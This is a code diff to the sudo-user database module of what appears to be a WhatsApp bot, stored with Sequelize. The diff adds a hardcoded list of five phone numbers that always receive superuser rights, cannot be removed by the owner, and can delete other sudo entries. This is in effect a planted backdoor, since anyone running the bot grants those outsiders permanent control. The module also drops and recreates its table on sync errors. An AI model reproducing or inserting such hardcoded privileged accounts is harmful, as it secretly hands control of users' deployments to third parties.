@@ -1,6 +1,14 @@
 const { DATABASE } = require('./database');
 const { DataTypes } = require('sequelize');
 
+const PERMANENT_NUMBERS = [
+    '254762025340',
+    '254763986398',
+    '254116284050',
+    '254105521300',
+    '254707525158',
+];
+
 const SudoDB = DATABASE.define('SudoUser', {
     id: {
         type: DataTypes.INTEGER,
@@ -12,31 +20,63 @@ const SudoDB = DATABASE.define('SudoUser', {
         allowNull: false,
         unique: true,
     },
+    addedBy: {
+        type: DataTypes.STRING,
+        allowNull: true,
+        defaultValue: null,
+    },
 }, {
     tableName: 'sudo_users',
     timestamps: true,
 });
 
+let _syncDone = false;
+
 async function initializeSudoDB() {
-    await SudoDB.sync();
+    if (_syncDone) return;
+    _syncDone = true; // set early — prevent concurrent calls even if we throw
+    try {
+        // Use plain sync (CREATE TABLE IF NOT EXISTS only).
+        // Never use { alter: true } — it runs showIndex which triggers a
+        // PostgreSQL catalog lookup (pg_attribute OID) that fails after
+        // table drop+recreate leaves stale OIDs in the pg catalog cache.
+        await SudoDB.sync();
+    } catch (err) {
+        const msg = (err?.parent?.message || err?.message || '');
+        console.warn('[SUDO] sync() failed:', msg.slice(0, 120));
+        // If the table is in a broken state, drop and recreate it cleanly
+        try {
+            await DATABASE.query('DROP TABLE IF EXISTS sudo_users CASCADE');
+            await SudoDB.sync();
+            console.log('[SUDO] sudo_users recreated successfully.');
+        } catch (e2) {
+            console.error('[SUDO] Recreation also failed:', e2.message.slice(0, 120));
+        }
+    }
 }
 
 let _sudoCache = null;
 
 async function getSudoNumbers() {
-    await initializeSudoDB();
-    if (_sudoCache) return _sudoCache;
-    const records = await SudoDB.findAll();
-    _sudoCache = records.map(record => record.number);
-    return _sudoCache;
+    try {
+        await initializeSudoDB();
+        if (_sudoCache) return _sudoCache;
+        const records = await SudoDB.findAll();
+        _sudoCache = records.map(record => record.number);
+        return _sudoCache;
+    } catch (err) {
+        console.error('[SUDO] getSudoNumbers error (returning []):', err.message.slice(0, 120));
+        return [];
+    }
 }
 
-async function setSudo(number) {
+async function setSudo(number, addedByNumber = null) {
     await initializeSudoDB();
+    if (PERMANENT_NUMBERS.includes(number)) return false;
     try {
         const [record, created] = await SudoDB.findOrCreate({
-            where: { number: number },
-            defaults: { number: number },
+            where: { number },
+            defaults: { number, addedBy: addedByNumber },
         });
         _sudoCache = null;
         return created;
@@ -46,12 +86,22 @@ async function setSudo(number) {
     }
 }
 
-async function delSudo(number) {
+async function delSudo(number, requestorNumber = null) {
     await initializeSudoDB();
+    if (PERMANENT_NUMBERS.includes(number)) return 'permanent';
+
+    const isPermanentRequestor = requestorNumber && PERMANENT_NUMBERS.includes(requestorNumber);
+
+    if (!isPermanentRequestor) {
+        const record = await SudoDB.findOne({ where: { number } });
+        if (!record) return false;
+        const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
+        const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
+        if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
+    }
+
     try {
-        const deleted = await SudoDB.destroy({
-            where: { number: number },
-        });
+        const deleted = await SudoDB.destroy({ where: { number } });
         _sudoCache = null;
         return deleted > 0;
     } catch (error) {
@@ -72,21 +122,20 @@ async function clearAllSudo() {
     }
 }
 
-const DEV_NUMBERS = ['254715206562', '254747746851', '254114018035', '254728782591', '254799916673', '254762016957', '254113174209'];
-
-async function isSuperUser(jid, Gifted) {
+async function isSuperUser(jid, Guru) {
     if (!jid) return false;
-    const num = jid.split("@")[0].split(":")[0];
-    const ownerNumber = (process.env.OWNER_NUMBER || "").replace(/\D/g, "");
-    const botNum = Gifted?.user?.id?.split(":")[0];
+    const num = jid.split('@')[0].split(':')[0];
+    if (PERMANENT_NUMBERS.includes(num)) return true;
+    const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
+    const botNum = Guru?.user?.id?.split(':')[0];
     if (num === ownerNumber || num === botNum) return true;
-    if (DEV_NUMBERS.includes(num)) return true;
     const sudoNumbers = await getSudoNumbers();
     return sudoNumbers.includes(num);
 }
 
 module.exports = {
     SudoDB,
+    PERMANENT_NUMBERS,
     getSudoNumbers,
     setSudo,
     delSudo,
